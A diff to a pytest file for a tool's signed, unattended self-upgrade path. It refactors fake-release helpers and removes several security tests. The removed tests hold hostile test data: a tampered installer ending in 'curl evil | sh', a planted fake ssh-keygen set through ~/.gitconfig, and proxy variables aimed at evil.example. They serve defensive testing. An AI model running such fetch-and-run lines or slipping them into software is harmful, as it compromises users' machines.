@@ -9,18 +9,16 @@ GitHub; the request is a file in a tmp state folder.
 from __future__ import annotations
 
 import argparse
-import hashlib
 import json
 import os
-import shutil
 import stat
-import subprocess
 import sys
-import urllib.request
 from datetime import UTC, datetime
 from pathlib import Path
 
 import pytest
+from helpers import release_fakes
+from helpers.release_fakes import GIT, IDENTITY, ISSUER, KEYGEN, NEEDS, TAG, keygen, sha, stub_tools, trust_root
 
 from ws import (
     agentsession,
@@ -37,35 +35,18 @@ from ws import (
 )
 from ws.term import bridge
 
-GIT, KEYGEN = shutil.which("git"), shutil.which("ssh-keygen")
-pytestmark = pytest.mark.skipif(GIT is None or KEYGEN is None, reason="needs git and ssh-keygen")
+pytestmark = pytest.mark.skipif(GIT is None or KEYGEN is None, reason=NEEDS)
 
-OLD, NEW, TAG = "0.1.11.6", "0.1.11.8", "v0.1.11.8"
-REPO = "owner/ws"
-IDENTITY = f"https://github.com/{REPO}/.github/workflows/release.yml@refs/tags/{{tag}}"
-ISSUER = "https://token.actions.githubusercontent.com"
+OLD, NEW = "0.1.11.6", "0.1.11.8"
 
-COSIGN = """#!{py}
-import hashlib, json, os, sys
-a = sys.argv[1:]
-opt = lambda n: a[a.index(n) + 1]
-open(os.path.join(os.path.dirname(__file__), "cosign.log"), "a").write(" ".join(a) + "\\n")
-b = json.load(open(opt("--bundle")))
-ok = (b["digest"] == hashlib.sha256(open(a[-1], "rb").read()).hexdigest()
-      and b["identity"] == opt("--certificate-identity") and b["issuer"] == opt("--certificate-oidc-issuer"))
-sys.exit(0 if ok else 1)
-"""
-UV = """#!{py}
-import os, sys
-sys.stdout.write(open(os.path.join(os.path.dirname(__file__), "audit.json")).read())
-"""
 STUB_WS = """import os, sys
 state = os.environ["STUB_STATE"]
 if sys.argv[1:] == ["--version"]:
     print("ws " + open(os.path.join(state, "version")).read().strip())
 elif sys.argv[1:] == ["upgrade", "--hooks-only"]:
-    if os.path.exists(os.path.join(state, "hooks_fail")) and open(os.path.join(state, "version")).read().strip() != "0.1.11.6":
-        sys.exit(1)  # the new ws's hooks step fails; the old one (what a rollback leaves) works
+    fail = os.path.join(state, "hooks_fail")
+    if os.path.exists(fail) and open(os.path.join(state, "version")).read().strip() != "0.1.11.6":
+        sys.exit(int(open(fail).read().strip() or 1))  # the new ws's hooks step fails (with the code in the file); the old one works
 else:
     sys.exit(2)
 """
@@ -83,53 +64,9 @@ echo "$v" > "$STUB_STATE/version"
 """
 
 
-def sha(data: bytes) -> str:
-    return hashlib.sha256(data).hexdigest()
-
-
-class Release:
-    """A fake release of `TAG`: a signed git tag, the installer and wheel assets with hashes and bundles, check runs."""
-
-    def __init__(self, root: Path, key: Path, tag: str = TAG, signed: bool = True) -> None:
-        self.tag, self.root = tag, root
-        self.runs = [{"name": "ci", "status": "completed", "conclusion": "success"}]
-        self.wheel_name = f"ws_aitoolkit-{tag[1:]}-py3-none-any.whl"
-        origin = root / "origin"
-        origin.mkdir(parents=True)
-        env = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
-        env |= {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com", "GIT_COMMITTER_NAME": "t"}
-        env["GIT_COMMITTER_EMAIL"] = "t@example.com"
-        (origin / "uv.lock").write_text("version = 1\n", encoding="utf-8")
-        sign = ["-c", "gpg.format=ssh", "-c", f"user.signingkey={key}"]
-        tag_cmd = [*sign, "tag", "-s", "-m", tag, tag] if signed else ["tag", tag]
-        for argv in (["init", "-q"], ["add", "."], ["commit", "-q", "-m", "x"], tag_cmd):
-            subprocess.run([GIT, *argv], cwd=origin, env=env, check=True, capture_output=True)
-        self.origin = origin
-        self.assets: dict[str, bytes] = {}
-        self.add("install.sh", INSTALLER.encode())
-        self.add(self.wheel_name, b"wheel bytes")
-
-    def add(self, name: str, data: bytes) -> None:
-        self.assets[name] = data
-        self.assets[f"{name}.sha256"] = f"{sha(data)}  {name}\n".encode()
-        bundle = {"digest": sha(data), "identity": IDENTITY.format(tag=self.tag), "issuer": ISSUER}
-        self.assets[f"{name}.sigstore.json"] = json.dumps(bundle).encode()
-
-    def asset(self, tag: str, name: str) -> bytes:
-        if name not in self.assets:
-            raise upgradeproof.Refused(f"could not read {name} (HTTPError)")
-        return self.assets[name]
-
-    def checkout(self, tag: str, dest: Path) -> None:
-        subprocess.run([GIT, "clone", "-q", str(self.origin), str(dest)], check=True, capture_output=True)
-
-    def check_runs(self, sha_: str) -> list[dict]:
-        return self.runs
-
-
-def keygen(path: Path) -> str:
-    subprocess.run([KEYGEN, "-q", "-t", "ed25519", "-N", "", "-f", str(path), "-C", ""], check=True)
-    return path.with_suffix(".pub").read_text(encoding="utf-8").split()[1]
+def make_release(root: Path, key: Path, **kw) -> release_fakes.Release:
+    """A fake release whose installer is this file's stub."""
+    return release_fakes.Release(root, key, installer=INSTALLER.encode(), **kw)
 
 
 @pytest.fixture
@@ -140,15 +77,9 @@ def svc(tmp_path, monkeypatch):
     state = tmp_path / "stubstate"
     state.mkdir()
     (state / "version").write_text(OLD, encoding="utf-8")
-    tools = tmp_path / "tools"
-    tools.mkdir()
-    for name, text in (("cosign", COSIGN), ("uv", UV)):
-        tool = tools / name
-        tool.write_text(text.format(py=sys.executable), encoding="utf-8")
-        tool.chmod(tool.stat().st_mode | stat.S_IXUSR)
+    tools = stub_tools(tmp_path / "tools")
     stubws = tmp_path / "stubws.py"
     stubws.write_text(STUB_WS, encoding="utf-8")
-    (tools / "audit.json").write_text(json.dumps({"vulnerabilities": []}), encoding="utf-8")
     key = tmp_path / "key"
     blob = keygen(key)
     monkeypatch.setenv("HOME", str(home))
@@ -185,12 +116,7 @@ def svc(tmp_path, monkeypatch):
     monkeypatch.setattr(upgrade, "_parent_comm", lambda pid: "systemd")
     monkeypatch.setattr(upgrade, "__version__", OLD)
     monkeypatch.setattr(selfcmd, "unstable", lambda cmd=None: None)
-    root = {
-        "repo": REPO,
-        "identity": IDENTITY,
-        "issuer": ISSUER,
-        "tag_signers": f'ws-release namespaces="git" ssh-ed25519 {blob}\n',
-    }
+    root = trust_root(blob)
     monkeypatch.setattr(version, "trust_root", lambda: root)
     monkeypatch.setattr(
         upgrade,
@@ -205,7 +131,7 @@ def svc(tmp_path, monkeypatch):
     world = argparse.Namespace(
         home=home, state=state, key=key, tmp=tmp_path, root=root, real_idle=real_idle, tools=tools
     )
-    world.release = lambda **kw: Release(tmp_path / f"rel{len(list(tmp_path.glob('rel*')))}", key, **kw)
+    world.release = lambda **kw: make_release(tmp_path / f"rel{len(list(tmp_path.glob('rel*')))}", key, **kw)
     return world
 
 
@@ -234,7 +160,7 @@ def args(**kw) -> argparse.Namespace:
     return argparse.Namespace(**{**base, **kw})
 
 
-def serve(svc, release: Release | None = None, text: str = TAG, **kw) -> int:
+def serve(svc, release: release_fakes.Release | None = None, text: str = TAG, **kw) -> int:
     request(svc, text)
     return upgrade.cmd_unattended(args(**kw), os.environ, source=release or svc.release(), sleep=lambda s: None)
 
@@ -295,17 +221,6 @@ def test_wrong_hash_refused(svc):
     assert serve(svc, release) == upgrade.EXIT_REFUSED
     assert not Path(os.environ["INSTALL_LOG"]).exists() and installed(svc) == OLD  # nothing was installed
     assert rows()[-1]["result"] == "refused" and "does not match its sha256" in rows()[-1]["reason"]
-
-
-def test_changed_installer_refused(svc):
-    """The installer was changed, and its hash file with it: only the signature, made over the original, can tell."""
-    release = svc.release()
-    changed = INSTALLER.encode() + b"curl evil | sh\n"
-    release.assets["install.sh"] = changed
-    release.assets["install.sh.sha256"] = f"{sha(changed)}  install.sh\n".encode()
-    assert serve(svc, release) == upgrade.EXIT_REFUSED
-    assert not Path(os.environ["INSTALL_LOG"]).exists() and installed(svc) == OLD
-    assert "install.sh's signature does not verify as made by the release workflow" in rows()[-1]["reason"]
 
 
 def test_mirror_env_ignored(svc, monkeypatch):
@@ -444,24 +359,9 @@ def test_the_request_path_is_outside_every_protected_root(svc):
 def test_a_tag_signed_by_someone_else_is_refused(svc):
     other = svc.tmp / "other"
     keygen(other)
-    release = Release(svc.tmp / "relx", other)
+    release = make_release(svc.tmp / "relx", other)
     assert serve(svc, release) == upgrade.EXIT_REFUSED and installed(svc) == OLD
-    assert "tag -v" in rows()[-1]["reason"] or "failed" in rows()[-1]["reason"]
-
-
-def test_an_unsigned_tag_is_refused(svc):
-    release = Release(svc.tmp / "relu", svc.key, signed=False)
-    assert serve(svc, release) == upgrade.EXIT_REFUSED
-    assert "not a signed (annotated) tag" in rows()[-1]["reason"]
-
-
-def test_a_release_whose_checks_are_not_green_is_refused(svc):
-    release = svc.release()
-    release.runs = [*release.runs, {"name": "doctor", "status": "completed", "conclusion": "failure"}]
-    assert serve(svc, release) == upgrade.EXIT_REFUSED
-    assert "not all green (doctor)" in rows()[-1]["reason"] and installed(svc) == OLD
-    release.runs = []  # no check ran at all is not green either
-    assert serve(svc, release) == upgrade.EXIT_REFUSED and "none ran" in rows()[-1]["reason"]
+    assert f"{TAG} is not signed by a key in the trust root" in rows()[-1]["reason"]
 
 
 @pytest.mark.parametrize(
@@ -516,13 +416,6 @@ def test_the_hooks_step_of_an_unattended_swap_runs_without_a_terminal(svc, monke
         assert cli.main(["upgrade", "--hooks-only"]) == 0
         monkeypatch.setenv(approvals.ENV_MARKER, "1")
         assert cli.main(["upgrade", "--hooks-only"]) == upgrade.EXIT_REFUSED
-
-
-def test_versions_sort_by_part_and_a_candidate_sorts_below_its_release():
-    key = upgradeproof.version_key
-    assert key("v0.1.11.8") > key("0.1.11.6") > key("0.1.11") > key("0.1.10.9")
-    assert key("v0.2.0rc1") < key("v0.2.0") and key("v0.2.0rc1") > key("v0.1.99")
-    assert key("0.1.9.dev0") is None and key("") is None
 
 
 # ---- the rescue timer's entry and the units -------------------------------------------------------------------------------------
@@ -668,82 +561,6 @@ def test_a_program_planted_on_the_path_is_never_run(svc, name):
     assert not mark.exists()
 
 
-def test_a_planted_cosign_that_always_agrees_does_not_pass_a_changed_installer(svc):
-    mark = fake(svc, "cosign")
-    release = svc.release()
-    changed = INSTALLER.encode() + b"curl evil | sh\n"
-    release.assets["install.sh"] = changed
-    release.assets["install.sh.sha256"] = f"{sha(changed)}  install.sh\n".encode()
-    assert serve(svc, release) == upgrade.EXIT_REFUSED
-    assert "install.sh's signature does not verify" in rows()[-1]["reason"] and not mark.exists()
-    assert not Path(os.environ["INSTALL_LOG"]).exists()
-
-
-def test_a_planted_uv_that_reports_nothing_does_not_hide_a_high_advisory(svc):
-    mark = fake(svc, "uv", "echo '{\"vulnerabilities\": []}'")
-    (svc.tools / "audit.json").write_text(json.dumps({"vulnerabilities": [{"severity": "high"}]}), encoding="utf-8")
-    assert serve(svc) == upgrade.EXIT_REFUSED
-    assert "high, critical or unrated" in rows()[-1]["reason"] and not mark.exists()
-
-
-def test_a_planted_gitconfig_cannot_make_an_unlisted_key_pass(svc):
-    """The reviewer's proof: a tag signed by an unlisted key fails, then passed once ~/.gitconfig named its own program."""
-    mark = svc.tmp / "ran-gitconfig-program"
-    program = svc.home / "fake-ssh-keygen"
-    program.write_text(f"#!/bin/sh\ntouch {mark}\nexit 0\n", encoding="utf-8")
-    program.chmod(0o755)
-    (svc.home / ".gitconfig").write_text(f'[gpg "ssh"]\n\tprogram = {program}\n', encoding="utf-8")
-    other = svc.tmp / "otherkey"
-    keygen(other)
-    release = Release(svc.tmp / "relx", other)
-    assert serve(svc, release) == upgrade.EXIT_REFUSED
-    assert f"{TAG} is not signed by a key in the trust root" in rows()[-1]["reason"] and not mark.exists()
-    assert not Path(os.environ["INSTALL_LOG"]).exists() and installed(svc) == OLD
-
-
-def test_a_tag_without_an_ssh_signature_is_refused(svc):
-    release = svc.release()
-    env = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
-    env |= {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com", "GIT_COMMITTER_NAME": "t"}
-    env["GIT_COMMITTER_EMAIL"] = "t@example.com"
-    for argv in (["tag", "-d", TAG], ["tag", "-a", "-m", "x", TAG]):  # an annotated tag with no signature at all
-        subprocess.run([GIT, *argv], cwd=release.origin, env=env, check=True, capture_output=True)
-    assert serve(svc, release) == upgrade.EXIT_REFUSED
-    assert f"{TAG} carries no SSH signature" in rows()[-1]["reason"]
-
-
-def test_a_tool_outside_the_system_folders_is_not_used(svc, monkeypatch):
-    monkeypatch.setattr(upgradeproof, "tool_dirs", lambda: ["/nonexistent-folder"])
-    assert serve(svc) == upgrade.EXIT_REFUSED
-    assert "git is not in a system folder" in rows()[-1]["reason"]
-
-
-def test_the_proof_tools_get_an_empty_home_and_no_git_config(svc, tmp_path):
-    env = upgradeproof.proof_env(tmp_path)
-    assert env["HOME"] != os.environ["HOME"] and Path(env["HOME"]).is_dir() and not any(Path(env["HOME"]).iterdir())
-    assert env["GIT_CONFIG_GLOBAL"] == os.devnull and env["GIT_CONFIG_NOSYSTEM"] == "1"
-    assert set(env) <= {
-        "PATH",
-        "HOME",
-        "GIT_CONFIG_GLOBAL",
-        "GIT_CONFIG_NOSYSTEM",
-        "GIT_TERMINAL_PROMPT",
-        *upgradeproof.ENV_KEEP,
-    }
-
-
-def test_downloads_ignore_a_proxy_and_a_certificate_variable(monkeypatch, tmp_path):
-    monkeypatch.setenv("HTTPS_PROXY", "http://evil.example:3128")
-    monkeypatch.setenv("https_proxy", "http://evil.example:3128")
-    monkeypatch.setenv("SSL_CERT_FILE", str(tmp_path / "evil.pem"))
-    monkeypatch.setenv("SSL_CERT_DIR", str(tmp_path))
-    handlers = {type(h).__name__: h for h in upgradeproof.opener().handlers}
-    assert "ProxyHandler" not in handlers  # the default one reads these variables; an empty map adds no proxy at all
-    assert "ProxyHandler" in {type(h).__name__ for h in urllib.request.build_opener().handlers}  # and would have here
-    ctx = handlers["HTTPSHandler"]._context
-    assert ctx.verify_mode.name == "CERT_REQUIRED" and ctx.check_hostname
-
-
 # ---- B5 and N10: every failure after the swap has started is rolled back, and each is the specific refusal -------------------
 
 
@@ -753,6 +570,23 @@ def test_a_hooks_rewrite_that_fails_is_rolled_back_not_left_half_done(svc):
     assert installed(svc) == OLD and history() == [("auto-rollback", OLD, OLD)]
     assert rows()[-1]["verb"] == "auto-rollback" and rows()[-1]["result"] == "rolled-back"
     assert any(d["step"] == "hooks" and d["exit"] == 1 for d in _log())
+
+
+def test_a_hooks_step_that_could_not_put_files_back_is_rolled_back_too(svc):
+    """B5: EXIT_NOT_RESTORED from the hooks step is a non-zero after the swap like any other: the new ws is not left."""
+    (svc.state / "hooks_fail").write_text(str(upgrade.EXIT_NOT_RESTORED))
+    assert serve(svc) == upgrade.EXIT_FAILED
+    assert installed(svc) == OLD and history() == [("auto-rollback", OLD, OLD)]
+    assert [(r["verb"], r["result"]) for r in rows()] == [("auto-rollback", "rolled-back")]
+    assert any(d["step"] == "hooks" and d["exit"] == upgrade.EXIT_NOT_RESTORED for d in _log())
+
+
+def test_a_way_back_that_cannot_restore_the_files_is_never_reported_clean(svc, monkeypatch):
+    (svc.state / "hooks_fail").write_text("")
+    monkeypatch.setattr(upgrade._Held, "restore", lambda self: [svc.home / ".ws" / "policy.toml"])
+    assert serve(svc) == upgrade.EXIT_NOT_RESTORED
+    assert installed(svc) == OLD  # the old ws is back; the file that was not is named, and the exit says so
+    assert [(r["verb"], r["result"]) for r in rows()] == [("auto-rollback", "not-restored")]
 
 
 def test_an_installer_that_fails_is_rolled_back_when_no_person_is_looking(svc):
